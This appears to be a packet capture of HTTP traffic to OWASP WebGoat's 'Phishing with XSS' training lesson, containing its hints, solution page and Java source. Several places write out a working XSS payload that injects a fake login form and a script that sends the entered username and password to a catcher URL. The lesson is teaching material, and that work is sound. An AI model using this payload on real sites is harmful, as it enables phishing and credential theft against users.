+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+eec.
+[{"hint":"Try adding HTML to the search field to create a fake authentication form, since the form is vulnerable to XSS.<BR> Try to make the form look official.","lesson":"Phishing","number":0},{"hint":"Try: <BR> &lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":1},{"hint":"Add functionality that can post a request, a button might work<BR><BR>After getting the button on the page, don't forget you will need to steal the credentials and post them to: <BR>http://localhost:8080/WebGoat/capture/PROPERTY=yes&ADD_CREDENTIALS_HERE","lesson":"Phishing","number":2},{"hint":"Try: <BR> &lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot;&gt;<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;","lesson":"Phishing","number":3},{"hint":"Make the button perform an action on submit, <BR>adding an onclick=\"hack()\" might work<BR>Don't forget to add the hack() javascript function<BR><BR>In the whole script:<BR><BR>&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H2&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;<BR>Also, check firebug. Does the search form need to be terminated for this to work...? (&lt;/form&gt;)","lesson":"Phishing","number":4},{"hint":"You need to create the hack() function.  This function will pull the credentials from the webpage and post them to the WebGoat catcher servlet. <BR><BR> Some useful code snippets:<UL><LI>doucument.phish.user.value - will acc
+
+T 192.168.33.1:58712 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonmenu.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41081 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonmenu.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41076 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/html.
+Content-Length: 739.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+<div align="Center"> 
+<p><b>Lesson Plan Title:</b> Phishing with XSS </p>
+ </div>
+ <p><b>Concept / Topic To Teach:</b> </p>
+<!-- Start Instructions -->
+It is always a good practice to validate all input on the server side.
+ XSS can occur when unvalidated user input is used in an HTTP response. 
+ With the help of XSS you can do a Phishing Attack and add content to a page
+ which looks official. It is very hard for a victim to determinate
+ that the content is malicious.
+<!-- Stop Instructions -->
+<p><b>General Goal(s):</b> </p>
+The user should be able to add a form asking for username
+and password. On submit the input should be sent
+to http://localhost/WebGoat/catcher?PROPERTY=yes &user=catchedUserName&password=catchedPasswordName
+
+
+
+T 192.168.0.100:80 -> 192.168.33.1:58715 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/html.
+Content-Length: 739.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+<div align="Center"> 
+<p><b>Lesson Plan Title:</b> Phishing with XSS </p>
+ </div>
+ <p><b>Concept / Topic To Teach:</b> </p>
+<!-- Start Instructions -->
+It is always a good practice to validate all input on the server side.
+ XSS can occur when unvalidated user input is used in an HTTP response. 
+ With the help of XSS you can do a Phishing Attack and add content to a page
+ which looks official. It is very hard for a victim to determinate
+ that the content is malicious.
+<!-- Stop Instructions -->
+<p><b>General Goal(s):</b> </p>
+The user should be able to add a form asking for username
+and password. On submit the input should be sent
+to http://localhost/WebGoat/catcher?PROPERTY=yes &user=catchedUserName&password=catchedPasswordName
+
+
+
+T 192.168.33.1:58715 -> 192.168.0.100:80 [AP]
+GET /WebGoat/service/lessonprogress.mvc HTTP/1.1.
+Host: webgoat.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+Connection: keep-alive.
+.
+
+
+T 192.168.0.100:41082 -> 192.168.0.10:8080 [AP]
+GET /WebGoat/service/lessonprogress.mvc HTTP/1.1.
+X-Forwarded-Host: webgoat.cyexc-target.
+X-Forwarded-Server: webgoat.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: webgoat.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: application/json, text/javascript, */*; q=0.01.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://webgoat.cyexc-target/WebGoat/start.mvc.
+X-Requested-With: XMLHttpRequest.
+Cookie: JSESSIONID=1DE275FF3CB6077682FF5DE9D98632FE.
+.
+
+
+T 192.168.0.10:8080 -> 192.168.0.100:41077 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: text/html.
+Content-Length: 4194.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Phising with XSS</title>
+<link rel="stylesheet" type="text/css" href="formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b> Phishing with XSS</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+It is always a good practice to validate all input on the 
+server side. XSS can occur when unvalidated user input is used 
+in an HTTP response. With the help of XSS you can do a Phishing 
+Attack and add content to a page which looks official. It is very 
+hard for a victim to determinate that the content is malicious.
+</p> 
+
+<p><b>General Goal(s):</b><br/>
+The user should be able to add a form asking for username 
+and password. On submit the input should be sent to 
+http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+</p>
+
+<b>Solution:</b><br/>
+With XSS it is possible to add further elements to an existing Page.
+This solution consists of two parts you have to combine:
+<ul>
+<li>A form the victim has to fill in</li>
+<li>A script which reads the form and sends the gathered information to the attacker</li>
+</ul>
+A Form with username and password could look like this:<br/>
+<p>
+&lt;/form&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+<br/><br/>Search for this term and you will see that a form is added to the page since the search field accepts HTML.
+<br/>The initial &lt;/form&gt; tag is to terminate the original search form.
+</p>
+Now you need a script:
+<p>
+&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;
+</p>
+<p>
+This script will read the input from the form and send it to the catcher of WebGoat.<br/>
+The text <font color="blue">in blue</font> should match what is in your address bar. If you are using ports and/or webscarab, it may be different.<br/>
+The last step is to put things together. Add a Button to the form which
+calls the script. You can reach this with the onclick="myFunction()" handler:
+</p>
+<p>
+&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
+<p>
+The final String looks like this:<br/>
+&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+</p>
+Search for this String and you will see a form asking for your username and password.
+Fill in these fields and click on the Login Button, which completes the lesson.<br/><br/>
+<img src="plugin_extracted/plugin/Phishing/lessonSolutions/en/Phishing_files/image001.jpg"><br/>
+
+T 192.168.0.100:80 -> 192.168.33.1:58716 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: text/html.
+Content-Length: 4194.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>Phising with XSS</title>
+<link rel="stylesheet" type="text/css" href="formate.css">
+</head>
+<body>
+<p><b>Lesson Plan Title:</b> Phishing with XSS</p>
+
+<p><b>Concept / Topic To Teach:</b><br/>
+It is always a good practice to validate all input on the 
+server side. XSS can occur when unvalidated user input is used 
+in an HTTP response. With the help of XSS you can do a Phishing 
+Attack and add content to a page which looks official. It is very 
+hard for a victim to determinate that the content is malicious.
+</p> 
+
+<p><b>General Goal(s):</b><br/>
+The user should be able to add a form asking for username 
+and password. On submit the input should be sent to 
+http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+</p>
+
+<b>Solution:</b><br/>
+With XSS it is possible to add further elements to an existing Page.
+This solution consists of two parts you have to combine:
+<ul>
+<li>A form the victim has to fill in</li>
+<li>A script which reads the form and sends the gathered information to the attacker</li>
+</ul>
+A Form with username and password could look like this:<br/>
+<p>
+&lt;/form&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+<br/><br/>Search for this term and you will see that a form is added to the page since the search field accepts HTML.
+<br/>The initial &lt;/form&gt; tag is to terminate the original search form.
+</p>
+Now you need a script:
+<p>
+&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;
+</p>
+<p>
+This script will read the input from the form and send it to the catcher of WebGoat.<br/>
+The text <font color="blue">in blue</font> should match what is in your address bar. If you are using ports and/or webscarab, it may be different.<br/>
+The last step is to put things together. Add a Button to the form which
+calls the script. You can reach this with the onclick="myFunction()" handler:
+</p>
+<p>
+&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;
+<p>
+The final String looks like this:<br/>
+&lt;/form&gt;&lt;script&gt;function hack(){ XSSImage=new Image; XSSImage.src=&quot;<font color="blue">http://localhost/WebGoat/</font>catcher?PROPERTY=yes&amp;user=&quot;+
+document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value + &quot;&quot;; alert(&quot;Had this been a real attack... Your credentials were just stolen.
+User Name = &quot; + document.phish.user.value + &quot;Password = &quot; +  document.phish.pass.value);}
+&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
+&gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;Enter Password:&lt;br&gt;&lt;input type=&quot;password&quot;
+name = &quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;hack()&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;
+</p>
+Search for this String and you will see a form asking for your username and password.
+Fill in these fields and click on the Login Button, which completes the lesson.<br/><br/>
+<img src="plugin_extracted/plugin/Phishing/lessonSolutions/en/Phishing_files/image001.jpg"><br/>
+
+T 192.168.0.10:8080 -> 192.168.0.100:41078 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+Content-Type: application/text.
+Content-Length: 8070.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Connection: close.
+.
+
+package org.owasp.webgoat.plugin;
+
+import java.util.ArrayList;
+import java.util.List;
+import org.apache.ecs.Element;
+import org.apache.ecs.ElementContainer;
+import org.apache.ecs.StringElement;
+import org.apache.ecs.html.B;
+import org.apache.ecs.html.BR;
+import org.apache.ecs.html.Comment;
+import org.apache.ecs.html.H1;
+import org.apache.ecs.html.HR;
+import org.apache.ecs.html.Input;
+import org.apache.ecs.html.TD;
+import org.apache.ecs.html.TH;
+import org.apache.ecs.html.TR;
+import org.apache.ecs.html.Table;
+import org.owasp.webgoat.Catcher;
+import org.owasp.webgoat.lessons.Category;
+import org.owasp.webgoat.lessons.LessonAdapter;
+import org.owasp.webgoat.session.ECSFactory;
+import org.owasp.webgoat.session.WebSession;
+
+
+/***************************************************************************************************
+ * 
+ * 
+ * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
+ * please see http://www.owasp.org/
+ * 
+ * Copyright (c) 2002 - 20014 Bruce Mayhew
+ * 
+ * This program is free software; you can redistribute it and/or modify it under the terms of the
+ * GNU General Public License as published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
+ * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ * 
+ * You should have received a copy of the GNU General Public License along with this program; if
+ * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
+ * 02111-1307, USA.
+ * 
+ * Getting Source ==============
+ * 
+ * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
+ * projects.
+ * 
+ * For details, please see http://webgoat.github.io
+ * 
+ * @author Bruce Mayhew &lt;a href=&quot;http://code.google.com/p/webgoat&quot;&gt;WebGoat&lt;/a&gt;
+ * @created March 13, 2007
+ */
+public class Phishing extends LessonAdapter
+{
+
+    /**
+     * Description of the Field
+     */
+    protected final static String SEARCH = &quot;Username&quot;;
+    private String searchText;
+
+    /**
+     * Description of the Method
+     * 
+     * @param s
+     *            Description of the Parameter
+     * @return Description of the Return Value
+     */
+    private boolean postedCredentials(WebSession s)
+    {
+        String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
+                                                                                                Catcher.EMPTY_STRING);
+
+        // &lt;Code Section Deliberately Omitted&gt;
+
+            ec.addElement(makeSearch(s));
+            if (postedCredentials(s))
+            {
+                makeSuccess(s);
+            }
+        } catch (Exception e)
+        {
+            s.setMessage(getLabelManager().get(&quot;PhishingErrorGenerating&quot;) + this.getClass().getName());
+        }
+
+        return (ec);
+    }
+
+    protected Element makeSearch(WebSession s)
+    {
+        ElementContainer ec = new ElementContainer();
+
+        ec.addElement(new H1().addElement(getLabelManager().get(&quot;PhishingDialogTitle&quot;)));
+        Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign(&quot;center&quot;);
+
+        TR tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+        if (s.isColor())
+        {
+            t.setBorder(1);
+        }
+
+        tr = new TR();
+        tr.addElement(new TH().addElement(getLabelManager().get(&quot;PhishingDialogText&quot;)).setColSpan(2)
+                .setAlign(&quot;center&quot;));
+        t.addElement(tr);
+
+        tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+
+        TR row1 = new TR();
+        row1.addElement(new TD(new B(new StringElement(getLabelManager().get(&quot;PhishingSearch1&quot;)))).setAlign(&quot;right&quot;));
+
+        Input input1 = new Input(Input.TEXT, SEARCH, searchText);
+        row1.addElement(new TD(input1).setAlign(&quot;left&quot;));
+        t.addElement(row1);
+
+        Element b = ECSFactory.makeButton(getLabelManager().get(&quot;PhishingSearch2&quot;));
+        t.addElement(new TR(new TD(b).setColSpan(2)).setAlign(&quot;center&quot;));
+        ec.addElement(t);
+
+        if (!searchText.equals(&quot;&quot;))
+        {
+            ec.addElement(new BR());
+            ec.addElement(new HR());
+            ec.addElement(new BR());
+            ec.addElement(new StringElement(getLabelManager().get(&quot;PhishingResults&quot;) + searchText));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingSearchResults&quot;)));
+            ec.addElement(new BR());
+            ec.addElement(new BR());
+            ec.addElement(new B(new StringElement(getLabelManager().get(&quot;PhishingNoResults&quot;))));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingEndOfSearchResults&quot;)));
+        }
+
+        return (ec);
+    }
+
+    /**
+     * Gets the hints attribute of the CluesScreen object
+     * 
+     * @return The hints value
+     */
+    protected List&lt;String&gt; getHints(WebSession s)
+    {
+        List&lt;String&gt; hints = new ArrayList&lt;String&gt;();
+        hints.add(getLabelManager().get(&quot;PhishingHint1&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint2&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint3&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint4&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint5&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint6&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint7&quot;));
+        /**
+         * password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials
+         * were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +
+         * document.phish.pass.value); XSSImage=new Image;
+         * XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;
+         * +document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value +
+         * &quot;&quot;;}&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;
+         * &lt;br&gt;
+         * &lt;HR&gt;
+         * &lt;H3&gt;This feature requires account login:&lt;/H2&gt; &lt;br&gt;
+         * &lt;br&gt;
+         * Enter Username:&lt;br&gt;
+         * &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;
+         * Enter Password:&lt;br&gt;
+         * &lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;
+         * &lt;input type=&quot;submit&quot; name=&quot;login&quot; 
+
+T 192.168.0.100:80 -> 192.168.33.1:58714 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Thu, 18 Jan 2018 13:02:18 GMT.
+Content-Type: application/text.
+Content-Length: 8070.
+Connection: keep-alive.
+Pragma: no-cache.
+Expires: Thu, 01 Jan 1970 00:00:00 GMT.
+Cache-Control: no-cache.
+Cache-Control: no-store.
+.
+
+package org.owasp.webgoat.plugin;
+
+import java.util.ArrayList;
+import java.util.List;
+import org.apache.ecs.Element;
+import org.apache.ecs.ElementContainer;
+import org.apache.ecs.StringElement;
+import org.apache.ecs.html.B;
+import org.apache.ecs.html.BR;
+import org.apache.ecs.html.Comment;
+import org.apache.ecs.html.H1;
+import org.apache.ecs.html.HR;
+import org.apache.ecs.html.Input;
+import org.apache.ecs.html.TD;
+import org.apache.ecs.html.TH;
+import org.apache.ecs.html.TR;
+import org.apache.ecs.html.Table;
+import org.owasp.webgoat.Catcher;
+import org.owasp.webgoat.lessons.Category;
+import org.owasp.webgoat.lessons.LessonAdapter;
+import org.owasp.webgoat.session.ECSFactory;
+import org.owasp.webgoat.session.WebSession;
+
+
+/***************************************************************************************************
+ * 
+ * 
+ * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
+ * please see http://www.owasp.org/
+ * 
+ * Copyright (c) 2002 - 20014 Bruce Mayhew
+ * 
+ * This program is free software; you can redistribute it and/or modify it under the terms of the
+ * GNU General Public License as published by the Free Software Foundation; either version 2 of the
+ * License, or (at your option) any later version.
+ * 
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
+ * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ * 
+ * You should have received a copy of the GNU General Public License along with this program; if
+ * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
+ * 02111-1307, USA.
+ * 
+ * Getting Source ==============
+ * 
+ * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
+ * projects.
+ * 
+ * For details, please see http://webgoat.github.io
+ * 
+ * @author Bruce Mayhew &lt;a href=&quot;http://code.google.com/p/webgoat&quot;&gt;WebGoat&lt;/a&gt;
+ * @created March 13, 2007
+ */
+public class Phishing extends LessonAdapter
+{
+
+    /**
+     * Description of the Field
+     */
+    protected final static String SEARCH = &quot;Username&quot;;
+    private String searchText;
+
+    /**
+     * Description of the Method
+     * 
+     * @param s
+     *            Description of the Parameter
+     * @return Description of the Return Value
+     */
+    private boolean postedCredentials(WebSession s)
+    {
+        String postedToCookieCatcher = getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY,
+                                                                                                Catcher.EMPTY_STRING);
+
+        // &lt;Code Section Deliberately Omitted&gt;
+
+            ec.addElement(makeSearch(s));
+            if (postedCredentials(s))
+            {
+                makeSuccess(s);
+            }
+        } catch (Exception e)
+        {
+            s.setMessage(getLabelManager().get(&quot;PhishingErrorGenerating&quot;) + this.getClass().getName());
+        }
+
+        return (ec);
+    }
+
+    protected Element makeSearch(WebSession s)
+    {
+        ElementContainer ec = new ElementContainer();
+
+        ec.addElement(new H1().addElement(getLabelManager().get(&quot;PhishingDialogTitle&quot;)));
+        Table t = new Table().setCellSpacing(0).setCellPadding(2).setBorder(0).setAlign(&quot;center&quot;);
+
+        TR tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+        if (s.isColor())
+        {
+            t.setBorder(1);
+        }
+
+        tr = new TR();
+        tr.addElement(new TH().addElement(getLabelManager().get(&quot;PhishingDialogText&quot;)).setColSpan(2)
+                .setAlign(&quot;center&quot;));
+        t.addElement(tr);
+
+        tr = new TR();
+        tr.addElement(new TD().addElement(&quot;&amp;nbsp;&quot;).setColSpan(2));
+        t.addElement(tr);
+
+        TR row1 = new TR();
+        row1.addElement(new TD(new B(new StringElement(getLabelManager().get(&quot;PhishingSearch1&quot;)))).setAlign(&quot;right&quot;));
+
+        Input input1 = new Input(Input.TEXT, SEARCH, searchText);
+        row1.addElement(new TD(input1).setAlign(&quot;left&quot;));
+        t.addElement(row1);
+
+        Element b = ECSFactory.makeButton(getLabelManager().get(&quot;PhishingSearch2&quot;));
+        t.addElement(new TR(new TD(b).setColSpan(2)).setAlign(&quot;center&quot;));
+        ec.addElement(t);
+
+        if (!searchText.equals(&quot;&quot;))
+        {
+            ec.addElement(new BR());
+            ec.addElement(new HR());
+            ec.addElement(new BR());
+            ec.addElement(new StringElement(getLabelManager().get(&quot;PhishingResults&quot;) + searchText));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingSearchResults&quot;)));
+            ec.addElement(new BR());
+            ec.addElement(new BR());
+            ec.addElement(new B(new StringElement(getLabelManager().get(&quot;PhishingNoResults&quot;))));
+            ec.addElement(new Comment(getLabelManager().get(&quot;PhishingEndOfSearchResults&quot;)));
+        }
+
+        return (ec);
+    }
+
+    /**
+     * Gets the hints attribute of the CluesScreen object
+     * 
+     * @return The hints value
+     */
+    protected List&lt;String&gt; getHints(WebSession s)
+    {
+        List&lt;String&gt; hints = new ArrayList&lt;String&gt;();
+        hints.add(getLabelManager().get(&quot;PhishingHint1&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint2&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint3&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint4&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint5&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint6&quot;));
+        hints.add(getLabelManager().get(&quot;PhishingHint7&quot;));
+        /**
+         * password&lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials
+         * were just stolen.\nUser Name = &quot; + document.phish.user.value + &quot;\nPassword = &quot; +
+         * document.phish.pass.value); XSSImage=new Image;
+         * XSSImage.src=&quot;http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;
+         * +document.phish.user.value + &quot;&amp;password=&quot; + document.phish.pass.value +
+         * &quot;&quot;;}&lt;/script&gt;&lt;form name=&quot;phish&quot;&gt;&lt;br&gt;
+         * &lt;br&gt;
+         * &lt;HR&gt;
+         * &lt;H3&gt;This feature requires account login:&lt;/H2&gt; &lt;br&gt;
+         * &lt;br&gt;
+         * Enter Username:&lt;br&gt;
+         * &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;
+         * Enter Password:&lt;br&gt;
+         * &lt;input type=&quot;password&quot; name = &quot;pass&quot;&gt;&lt;br&gt;
+         * &lt;input type=&quot;submit&quot; name=&quot;login&quot; 
+
+T 192.168.0.10:8080 -> 192.168.0.100:41082 [AP]
